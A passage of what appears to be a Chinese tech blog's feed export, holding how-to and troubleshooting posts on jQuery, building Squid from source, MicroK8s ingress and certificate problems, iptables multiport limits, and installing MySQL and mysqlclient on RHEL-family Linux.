<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		$(<span class="string">&quot;li&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			$(<span class="variable language_">this</span>).<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">		&#125;);</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="案例表格操作">案例：表格操作</span></h2><p>点击删除按钮，删除一整行</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Operation<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>Jay Zhou<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;delete&quot;</span>, <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>, <span class="attr">value</span>=<span class="string">&quot;删除&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>Wang Lao 5<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;delete&quot;</span>, <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>, <span class="attr">value</span>=<span class="string">&quot;删除&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;static/jquery-3.7.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        $(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.delete&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                $(<span class="variable language_">this</span>).<span class="title function_">parent</span>().<span class="title function_">parent</span>().<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>draft</category>
      </categories>
      <tags>
        <tag>frontend</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>源码编译并安装Squid的方法</title>
    <url>/2024/0831132417.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>RockyLinux9.4 yum包中的Squid版本是5.5, 不是最新的版本，我需要安装最新版本的Squid。</p>
<h2><span id="源码编译并安装squid的步骤">源码编译并安装Squid的步骤</span></h2><ul>
<li>访问<a href="https://www.squid-cache.org/Versions/">Squid官网</a>，查看最新的稳定版本为 6.10</li>
<li>下载6.10版本的源码，各发行版编译安装Squid的方法参考<a href="https://wiki.squid-cache.org/SquidFaq/CompilingSquid">官方文档</a></li>
</ul>
<p>下面给出我在RockyLinux9.4 VMware虚拟机上，编译安装Squid 6.10的过程：</p>
<span id="more"></span>

<h3><span id="下载依赖">下载依赖</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y perl gcc autoconf automake make <span class="built_in">sudo</span> wget</span><br><span class="line">yum install -y libxml2-devel libcap-devel libtool-ltdl-devel</span><br></pre></td></tr></table></figure>
<h3><span id="下载squid源码并编译安装">下载Squid源码并编译安装</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.squid-cache.org/Versions/v6/squid-6.10.tar.gz</span><br><span class="line">tar -zxvf squid-6.10.tar.gz</span><br><span class="line"><span class="built_in">cd</span> squid-6.10</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr --includedir=/usr/include --datadir=/usr/share --bindir=/usr/sbin --libexecdir=/usr/lib/squid --localstatedir=/var --sysconfdir=/etc/squid</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<h3><span id="添加squid用户-创建squid日志目录并设置权限">添加squid用户, 创建Squid日志目录并设置权限</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -M -s /sbin/nologin squid</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/log/squid</span><br><span class="line"><span class="built_in">chown</span> -R squid:squid /var/log/squid</span><br></pre></td></tr></table></figure>

<h3><span id="修改squid配置文件">修改squid配置文件</span></h3><p>修改<code>/etc/squid/squid.conf</code>，新增如下配置项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cache_effective_user squid</span><br><span class="line">cache_effective_group squid</span><br><span class="line">cache_log /var/log/squid/cache.log</span><br><span class="line">access_log /var/log/squid/access.log squid</span><br></pre></td></tr></table></figure>
<p>注意事项：</p>
<ul>
<li>需要指定<code>cache_effective_user</code>和<code>cache_effective_group</code>, 一般设置为squid; 注意不能设置成root，否则启动会提示错误。</li>
<li>如果不设置<code>cache_effective_user</code>和<code>cache_effective_group</code>, Squid进程的user和group为nobody，启动后会异常退出，报fopen写入cache.log没有权限(13)的错误！</li>
<li>在squid配置文件里自定义<code>cache_log</code>,<code>access_log</code>的路径为&#x2F;var&#x2F;log&#x2F;squid。默认的路径为&#x2F;var&#x2F;log, squid用户没有权限写入。</li>
</ul>
<h3><span id="测试squid配置是否正确">测试Squid配置是否正确</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">squid -k parse</span><br><span class="line">squid -z</span><br></pre></td></tr></table></figure>
<p>如果提示报错，根据错误信息修改配置项。</p>
<h3><span id="启动squid">启动Squid</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">squid <span class="comment"># 启动</span></span><br><span class="line">netstat -anpt | grep squid <span class="comment"># Squid默认端口3128, 用netstat查看3128端口是否LISTEN</span></span><br><span class="line">tcp6  0  0  :::3128          :::*         LISTEN    pid/(squid-1)</span><br></pre></td></tr></table></figure>
<h3><span id="测试squid">测试Squid</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -x localhost:3128 https://www.baidu.com</span><br></pre></td></tr></table></figure>
<h3><span id="停止squid">停止Squid</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">squid -k shutdown</span><br></pre></td></tr></table></figure>
<h2><span id="参考">参考</span></h2><p><a href="https://www.squid-cache.org/">https://www.squid-cache.org/</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s ingress启动失败, 10254端口被占用问题定位</title>
    <url>/2024/0904203111.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>RHEL9 VM里安装了Microk8s，且使用了Nginx ingress Controller插件，443端口正常。 VM重启一次后，发现443端口没有LISTEN，不能对外提供服务。 </p>
<h2><span id="定位过程">定位过程</span></h2><p>查看ingress pod状态，为CrashLoopBackOff</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl -n ingress get pods</span></span><br><span class="line">NAME                                      READY   STATUS             RESTARTS         AGE</span><br><span class="line">nginx-ingress-microk8s-controller-b6krf   0/1     CrashLoopBackOff   1102 (55s ago)   8d</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>再查看启动日志，通过<code>kubectl logs</code>命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl -n ingress logs nginx-ingress-microk8s-controller-b6krf | <span class="built_in">head</span> -n 20</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NGINX Ingress controller</span><br><span class="line">  Release:       v1.2.0</span><br><span class="line">  Build:         a2514768cd282c41f39ab06bda17efefc4bd233a</span><br><span class="line">  Repository:    https://github.com/kubernetes/ingress-nginx</span><br><span class="line">  nginx version: nginx/1.19.10</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">W0903 07:03:51.041545       7 client_config.go:617] Neither --kubeconfig nor --master was specified.  Using the inClusterConfig.  This might not work.</span><br><span class="line">I0903 07:03:51.041798       7 main.go:230] <span class="string">&quot;Creating API client&quot;</span> host=<span class="string">&quot;https://10.152.183.1:443&quot;</span></span><br><span class="line">I0903 07:03:51.079803       7 main.go:274] <span class="string">&quot;Running in Kubernetes cluster&quot;</span> major=<span class="string">&quot;1&quot;</span> minor=<span class="string">&quot;23+&quot;</span> git=<span class="string">&quot;v1.23.10-2+b9088462d1df8c&quot;</span> state=<span class="string">&quot;clean&quot;</span> commit=<span class="string">&quot;b9088462d1df8ccd2a1856d329af381fa2bce5a3&quot;</span> platform=<span class="string">&quot;linux/amd64&quot;</span></span><br><span class="line">I0903 07:03:51.203652       7 main.go:104] <span class="string">&quot;SSL fake certificate created&quot;</span> file=<span class="string">&quot;/etc/ingress-controller/ssl/default-fake-certificate.pem&quot;</span></span><br><span class="line">I0903 07:03:51.259671       7 nginx.go:256] <span class="string">&quot;Starting NGINX Ingress controller&quot;</span></span><br><span class="line">F0903 07:03:51.259727       7 main.go:345] listen tcp :10254: <span class="built_in">bind</span>: address already <span class="keyword">in</span> use</span><br><span class="line">goroutine 117 [running]:</span><br><span class="line">k8s.io/klog/v2.stacks(0x1)</span><br><span class="line">        k8s.io/klog/v2@v2.60.1/klog.go:860 +0x8a</span><br></pre></td></tr></table></figure>

<p>发现报错：<code>listen tcp :10254: bind: address already in use</code>, 10254端口是ingress用于健康检查的端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl -n ingress get ds nginx-ingress-microk8s-controller -o yaml</span><br><span class="line">...</span><br><span class="line">livenessProbe:</span><br><span class="line">	httpGet:</span><br><span class="line">		path: /healthz</span><br><span class="line">		port: 10254</span><br></pre></td></tr></table></figure>

<p>netstat查下10254端口被哪个进程占用了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@sg3 svc]# netstat -antp | grep containerd</span><br><span class="line">tcp        0      0 127.0.0.1:1338          0.0.0.0:*               LISTEN      3631/containerd</span><br><span class="line">tcp        0      0 127.0.0.1:10254         0.0.0.0:*               LISTEN      3631/containerd</span><br></pre></td></tr></table></figure>
<p>发现是containerd占用了10254端口。因为重启前ingress是正常的，于是猜测这个containerd端口是随机分配的，接着验证一下猜测是否正确。</p>
<p>下一份containerd代码看看，先查containerd版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snap list</span><br><span class="line">microk8s  v1.23.10  3699   -         canonical✓  classic</span><br><span class="line"></span><br><span class="line">microk8s ctr version</span><br><span class="line">Client:</span><br><span class="line">  Version:  v1.5.13</span><br></pre></td></tr></table></figure>
<p>containerd版本为v.1.5.13，找到源码 <a href="https://github.com/containerd/containerd/releases/tag/v1.5.13">https://github.com/containerd/containerd/releases/tag/v1.5.13</a></p>
<p>简单扫下源码，找到containerd配置文件的路径：<code>/var/snap/microk8s/current/args/containerd-template.toml</code>，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[grpc]</span><br><span class="line"># ......</span><br><span class="line"></span><br><span class="line">[metrics]</span><br><span class="line">	address=&quot;127.0.0.1:1338&quot;</span><br><span class="line"># ......</span><br><span class="line"></span><br><span class="line">[ plugins. &quot;io.containerd.grpc.v1.cri&quot; ]</span><br><span class="line">  stream_server_address = &quot;127.0.0.1&quot;</span><br><span class="line">  stream_server_port = &quot;0&quot;</span><br></pre></td></tr></table></figure>

<p><code>journalctl -xeu snap.microk8s.daemon-containerd.service</code>查下启动日志，通过启动日志中的关键字快速定位到相关代码：<br><img data-src="/2024/0904203111/image1.png"><br>分析配置文件和代码，找到原因：<strong>containerd配置文件中的stream_server_port默认为0, 说明监听了随机端口号，所以可能存在端口冲突。</strong></p>
<h2><span id="解决方法">解决方法</span></h2><p>可以给containerd指定一个端口号，防止端口冲突。 比如改成10300（具体改哪个端口根据你的情况定，这里只举个例子)，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/stream_server_port = &quot;[^&quot;]*&quot;/stream_server_port = &quot;10300&quot;/&#x27;</span> /var/snap/microk8s/current/args/containerd-template.toml</span><br><span class="line">microk8s stop</span><br><span class="line">microk8s start</span><br></pre></td></tr></table></figure>
<p>github上找到类似了issue：<a href="https://github.com/containerd/containerd/issues/7097">https://github.com/containerd/containerd/issues/7097</a></p>
<h2><span id="参考">参考</span></h2><p><a href="https://www.thebyte.com.cn/container/CRI-in-Kubernetes.html">https://www.thebyte.com.cn/container/CRI-in-Kubernetes.html</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>[MicroK8s] Unable to connect to the server: x509: certificate has expired or is not yet valid 问题定位案例</title>
    <url>/2024/0905201723.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>客户有一台基于Hyper-V创建的RHEL9虚拟机, 安装了MicroK8s, 启动正常。<br>虚拟机重启后, kubectl报错: <code>Unable to connect to the server: x509: certificate has expired or is not yet valid</code></p>
<h2><span id="定位过程">定位过程</span></h2><p>这个报错说明MicroK8s apiserver证书的有效时间不对。 首先简单了解下Microk8s证书（以下内容 by ChatGPT）</p>
<span id="more"></span>
<ul>
<li>在 MicroK8s 中，ca.crt 和 server.crt 是位于 &#x2F;var&#x2F;snap&#x2F;microk8s&#x2F;current&#x2F;certs&#x2F; 目录下的两个重要证书，作用如下：</li>
<li>ca.crt：这是集群的根证书颁发机构（CA）证书，用于签署其他所有的证书，包括 API 服务器证书、客户端证书、节点证书等。它是建立集群内部所有组件之间信任的基础  。</li>
<li>server.crt：这个证书是 Kubernetes API 服务器使用的 TLS 证书，它包括了 API 服务器服务的 DNS 名称和 IP 地址。当使用 kubectl 请求 API 服务器时，会使用到这个证书来确保通信的安全性  。</li>
<li>当你使用 kubectl 请求 API 服务器时，kubectl 会使用 ca.crt 中的 CA 证书来验证 server.crt 的有效性。如果 server.crt 证书尚未过期，且由受信任的 CA 签发，kubectl 将接受该证书并继续通信 。</li>
<li>如果遇到证书过期或即将过期的问题，可以使用 MicroK8s 的 refresh-certs 命令来刷新证书 。这个命令会帮助更新 CA 证书和重新生成 API 服务器证书，以及其他相关的证书 。</li>
</ul>
<p>回到问题，先通过<code>openssl</code>查看apiserver证书有效时间：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -<span class="keyword">in</span> /var/snap/microk8s/current/certs/server.crt -text -noout | grep Not</span><br><span class="line">Not Before: Oct 4 00:01:28 2024 GMT</span><br><span class="line">Not After : Oct 4 00:01:28 2025 GMT</span><br></pre></td></tr></table></figure>
<p>再查看当前系统时间：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl</span><br><span class="line">      Local time: Thu 2024-09-05 06:52:02 UTC</span><br><span class="line">  Universal time: Thu 2024-09-05 06:52:02 UTC</span><br><span class="line">        RTC time: Thu 2024-09-05 06:52:03</span><br><span class="line">       Time zone: America/New_York (EDT, -0400)</span><br><span class="line">     NTP enabled: <span class="built_in">yes</span></span><br><span class="line">NTP synchronized: <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
<p>发现问题：<strong>当前系统时间是09-05, 而证书有效开始时间是10-04，是一个未来的时间，所以报<code>certificate is not yet valid</code></strong></p>
<p>我测了几次，发现每次VM重启后，microk8s都会根据当时系统时间重新生成一次apiserver证书。(只重启k8s不重启机器，不会生成新的证书)</p>
<p>客户环境的证书有效开始时间是10-04，又配置了NTP，这说明重新生成证书的那个时刻，系统时间就是10-04，随后NTP服务启动，系统时间又被改对了而已。 通过启动日志确认这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg -T | grep rtc <span class="comment">#(或者查/var/log/message)</span></span><br><span class="line">[Thu Sep 5 06:46:09 2024] rtc_cmos 00:01: setting system clock to 2024-10-04T00:01:04 UTC</span><br></pre></td></tr></table></figure>
<p>从启动日志中，发现VM的RTC时间果然是10-04，比正确时间快了接近一个月。 总结下这个问题发生的过程：</p>
<ul>
<li>Hyper-V没有正确同步VM的RTC时间，VM重启的时刻RTC时间为10-04，这个未来的时间被同步给了系统时间。</li>
<li>MicroK8s重新生成apiserver证书，证书有效时间设置为系统时间10-04</li>
<li>chronyd服务启动, 系统时间又被NTP server同步成了正确的时间09-05</li>
<li>当前系统时间(09-05)早于证书有效时间(10-04)，所以kubectl报错 <code>certificate is not yet valid</code></li>
</ul>
<p>至于Hyper-V为什么没有正确同步虚拟机的RTC时间，这个需要Microsoft的支持。 下面给出一个workaround规避这个问题：</p>
<h2><span id="解决方法">解决方法</span></h2><p>每次启动判断下MicroK8s证书时间是否有效，如果是一个未来的时间，就重新刷下MicroK8s证书。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CERT_FILE=<span class="string">&quot;/var/snap/microk8s/current/certs/server.crt&quot;</span></span><br><span class="line">not_before=$(<span class="built_in">date</span> -d <span class="string">&quot;<span class="subst">$(openssl x509 -noout -dates -in <span class="string">&quot;<span class="variable">$CERT_FILE</span>&quot;</span> | grep <span class="string">&quot;notBefore&quot;</span> | cut -d= -f2)</span>&quot;</span> +%s)</span><br><span class="line">current_time=$(($(date +%s) + <span class="number">300</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$not_before</span>&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$current_time</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$not_before</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	microk8s refresh-certs --cert server.crt</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>注：RTC时间可以不用手动设置，因为配置了NTP server之后一段时间会自动同步</p>
<p>可以添加一个systemd service, 使用<code>systemctl enable</code>命令，每次启动的时候执行。service配置文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Refresh k8s certs if cert is not yet valid</span><br><span class="line">After=chronyd.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/path/to/your_script.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables单个multiport规则最多只能指定15个端口问题的解决方法</title>
    <url>/2024/0912211401.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>我想通过iptables允许以下这20个端口通过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -i eth0 -m multiport --dports 22,80,443,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46 -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>执行后报错，<code>iptables: too many ports specified</code></p>
<h2><span id="原因">原因</span></h2><p>查看<a href="https://linux.die.net/man/8/iptables">iptables官方文档</a>, 发现iptables单条multiports规则最多只支持15个端口。 原文如下： </p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">multiport</span><br><span class="line"></span><br><span class="line">This module matches a set of source or destination ports. Up to 15 ports can be specified. A port range (port:port) counts as two ports. It can only be used in conjunction with -p tcp or -p udp.</span><br></pre></td></tr></table></figure>
<h2><span id="解决方法">解决方法</span></h2><p>每15个端口新增一条multiport的rule即可, 代码参考:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">all_ports=<span class="string">&quot;22,80,443,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46&quot;</span></span><br><span class="line">ports_array=($(<span class="built_in">echo</span> <span class="variable">$all_ports</span> | <span class="built_in">tr</span> <span class="string">&#x27;,&#x27;</span> <span class="string">&#x27; &#x27;</span>))</span><br><span class="line">ports=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> (( i=<span class="number">0</span>; i&lt;<span class="variable">$&#123;#ports_array[@]&#125;</span>; i++ )); <span class="keyword">do</span></span><br><span class="line">    ports+=<span class="string">&quot;<span class="variable">$&#123;ports_array[$i]&#125;</span>,&quot;</span></span><br><span class="line">    <span class="comment"># One iptables multiports rule supports at most 15 ports</span></span><br><span class="line">    <span class="keyword">if</span> (( (i + <span class="number">1</span>) % <span class="number">15</span> == <span class="number">0</span> || i == <span class="variable">$&#123;#ports_array[@]&#125;</span> - <span class="number">1</span> )); <span class="keyword">then</span></span><br><span class="line">        ports=<span class="variable">$&#123;ports%,&#125;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;ports: <span class="variable">$&#123;ports&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">sudo</span> iptables -I INPUT -p tcp -m multiport --dports <span class="variable">$&#123;ports&#125;</span> -j ACCEPT</span><br><span class="line">        <span class="built_in">sudo</span> iptables -I INPUT -p tcp -m multiport --sports <span class="variable">$&#123;ports&#125;</span> -j ACCEPT</span><br><span class="line">        ports=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://linux.die.net/man/8/iptableshttps://linux.die.net/man/8/iptables">https://linux.die.net/man/8/iptables</a></p>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>在RHEL9上安装MySQL</title>
    <url>/2024/0916144756.html</url>
    <content><![CDATA[<h2><span id="安装并启动mysql">安装并启动MySQL</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dnf install -y mysql-server</span><br><span class="line">systemctl start mysqld.service</span><br></pre></td></tr></table></figure>

<h2><span id="设置mysql的root用户密码">设置MySQL的root用户密码</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>
<p><code>mysql_secure_installation</code>是MySQL的一个安全脚本，执行后根据提示选择密码强度，输入root用户的密码</p>
<h2><span id="查看mysql的版本">查看MySQL的版本</span></h2><p>通过mysqladmin查到MySQL版本为8.0.36</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root -p version</span><br><span class="line">Enter password:</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">Server version          8.0.36</span><br></pre></td></tr></table></figure>
<h2><span id="连接mysql">连接MySQL</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
<p>再输入你之前设置的root用户密码即可。</p>
<span id="more"></span>
<h2><span id="参考">参考</span></h2><p><a href="https://juejin.cn/post/7162834297739542565">https://juejin.cn/post/7162834297739542565</a></p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Rocky Linux 9安装mysqlclient库报错的解决方法</title>
    <url>/2024/0916170317.html</url>
    <content><![CDATA[<h2><span id="环境">环境</span></h2><p>VMware Rocky Linux 9.4 MySQL 8.0</p>
<h2><span id="安装mysqlclient报错">安装mysqlclient报错</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install python3-devel</span><br><span class="line">pip3 install mysqlclient</span><br></pre></td></tr></table></figure>
<p>报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Downloading http://mirrors.aliyun.com/pypi/packages/37/fb/d9a8f763c84f1e789c027af0ffc7dbf94c9a38db961484f253f0552cbb47/mysqlclient-2.2.1.tar.gz (89 kB)</span><br><span class="line">     |████████████████████████████████| 89 kB 80.1 MB/s</span><br><span class="line">  Installing build dependencies ... done</span><br><span class="line">  Getting requirements to build wheel ... error</span><br><span class="line">  ERROR: Command errored out with exit status 1:</span><br><span class="line">   command: /usr/bin/python3 /usr/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py get_requires_for_build_wheel /tmp/tmp5fvp1dau</span><br><span class="line">       cwd: /tmp/pip-install-1nnewfot/mysqlclient_93347d191d2942c8b2bb37681a22fd09</span><br><span class="line">  Exception: Can not find valid pkg-config name.</span><br><span class="line">  Specify MYSQLCLIENT_CFLAGS and MYSQLCLIENT_LDFLAGS env vars manually</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="解决方法">解决方法</span></h2><p>需要先安装mysql-devel这个RPM包，再用pip安装mysqlclient，操作如下：<br>在 <a href="https://dev.mysql.com/downloads/repo/yum/">https://dev.mysql.com/downloads/repo/yum/</a> 找到MySQL 8.0版本对应的<code>mysql84-community-release-el9-1.noarch.rpm</code>，把这个RPM包拷到VM里手动安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -i mysql84-community-release-el9-1.noarch.rpm</span><br><span class="line">yum install -y python3-devel mysql-devel</span><br><span class="line">pip3 install mysqlclient</span><br></pre></td></tr></table></figure>
<p><code>pip list</code> 命令查看已安装的mysqlclient信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip list  | grep mysqlclient</span><br><span class="line">mysqlclient         2.2.4</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://stackoverflow.com/questions/76585758/mysqlclient-cannot-install-via-pip-cannot-find-pkg-config-name-in-ubuntu">https://stackoverflow.com/questions/76585758/mysqlclient-cannot-install-via-pip-cannot-find-pkg-config-name-in-ubuntu</a></p>
]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django基础</title>
    <url>/2024/0915151753.html</url>
    <content><![CDATA[<h2><span id="django快速上手">Django快速上手</span></h2><p>参考: <a href="https://pcj600.github.io/2024/0823230254.html">Django快速上手</a></p>
<h2><span id="再写几个页面">再写几个页面</span></h2><p>编辑<code>demo1/urls.py</code>, 添加URL和视图函数映射</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;index/&#x27;</span>, views.index),</span><br><span class="line">	path(<span class="string">&#x27;user/list/&#x27;</span>, views.user_list),</span><br><span class="line">	path(<span class="string">&#x27;user/add/&#x27;</span>, views.user_add),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>编辑<code>app01/views.py</code>，添加几个函数</p>
